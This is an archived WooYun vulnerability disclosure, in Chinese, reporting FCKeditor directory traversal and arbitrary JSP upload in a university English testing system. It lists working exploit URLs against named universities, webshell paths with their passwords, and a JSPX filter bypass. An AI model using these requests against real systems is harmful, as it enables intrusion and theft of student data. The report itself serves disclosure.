{"id": 29668, "wybug_id": "wooyun-2015-0118641", "wybug_title": "某大学测试与训练系统通用型漏洞打包（getshell）", "wybug_corp": "外语教学与研究出版社", "wybug_author": "路人甲", "wybug_date": "2015-06-09 10:37", "wybug_open_date": "2015-09-10 19:20", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向公众公开  简要描述： 任意文件上传、文件遍历等等 详细说明：  关键字：iTEST大学英语测试与训练系统很多案例在校园内网\n\n\n\n官网也许是这个http://itest.heep.cn/或是这个http://preenglish.itest.fltrp.com/以http://itest.heep.cn/为例，问题的产生是由于该套建站软件使用的编辑器fck未正确配置目录遍历\nhttp://itest.heep.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../\n\n\n\n\n任意文件上传\nhttp://itest.heep.cn/FCKeditor/editor/filemanager/browser/default/browser.html?Connector=http://itest.heep.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector\n访问以上链接提示登录超时，所以本地直接构造poc（见测试代码）\n\n\n\nhttp://itest.heep.cn/UserFiles/wooyun.jsp\n\n再次上传一句话http://itest.heep.cn/UserFiles/wooyun1.jsp密码：woo0yun\n\n\n\n\n\n发现的几个站中都存在svn信息泄漏http://itest.heep.cn/FCKeditor//.svn/entrieshttp://itest.heep.cn/admin//.svn/entries\n\n在我发现几个站点中，根目录下都有一个oa.log文件，将泄漏站点的部分敏感信息，如绝对路径http://itest.heep.cn/oa.log\n\n   漏洞证明：  以下为我发现的案例\nhttp://itest.ntu.edu.cn/南通大学http://itest.ntu.edu.cn//FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../http://itest.ntu.edu.cn/oa.loghttp://itest.ntu.edu.cn/admin/.svn/entries\n\n\n\n\n\n\n南开大学的上传，限制了jsp，但jspx可以，在上传的时候，老方法poc，但poc的内容修改了一下，不然无法进行上传\nCommand=FileUpload&Type=File&CurrentFolder=%2F\n上传后的一句话地址：http://itest.ntu.edu.cn/UserFiles/File//wooyun2.jspx密码：023\n\nhttp://itest.hrbeu.edu.cn/哈尔滨工程大学\nhttp://itest.hrbeu.edu.cn/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../http://itest.hrbeu.edu.cn/oa.loghttp://itest.hrbeu.edu.cn/admin//.svn/entries\n\n\n\n\n\n\n\n\nhttp://itest.hrbeu.edu.cn/UserFiles/wooyun.jsp\n\nhttp://wwet.hytc.edu.cn/淮阴师范学院\nhttp://wwet.hytc.edu.cn/oa.log  这个可以访问http://wwet.hytc.edu.cn/admin//.svn/entries  waf拦截访问？\n\n\nfck也存在，但上传和目录遍历不行了，这个站把我ip给禁了，呵呵放弃http://182.139.132.40/四川大学http://182.139.132.40/oa.log\n\n用另一种方式，本地构造上传页面进行上传\n\n\n\n不知名学校http://222.200.98.253/oa.loghttp://222.200.98.253/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../http://202.199.162.54/oa.loghttp://202.199.162.54/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../http://210.28.218.115//oa.loghttp://210.28.218.115/admin//.svn/entrieshttp://210.28.218.115//FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/../http://222.197.91.116/oa.log 西南民族大学http://222.197.91.116/admin//.svn/entrieshttp://222.197.91.116//FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/../体验站点http://preenglish.itest.fltrp.com/oa.loghttp://preenglish.itest.fltrp.com/admin//.svn/entrieshttp://preenglish.itest.fltrp.com/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/不同ip的体验站点http://nurse.itest.fltrp.com//FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/http://nurse.itest.fltrp.com//FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/../以上系统数据的内容包含学生的姓名学号班级系别\n\n英语考试的成绩、英语试题等   修复方案：  正确配置fck，敏感文件oa.log建议更换目录存放   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-06-12 19:19 厂商回复： CNVD确认并复现所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}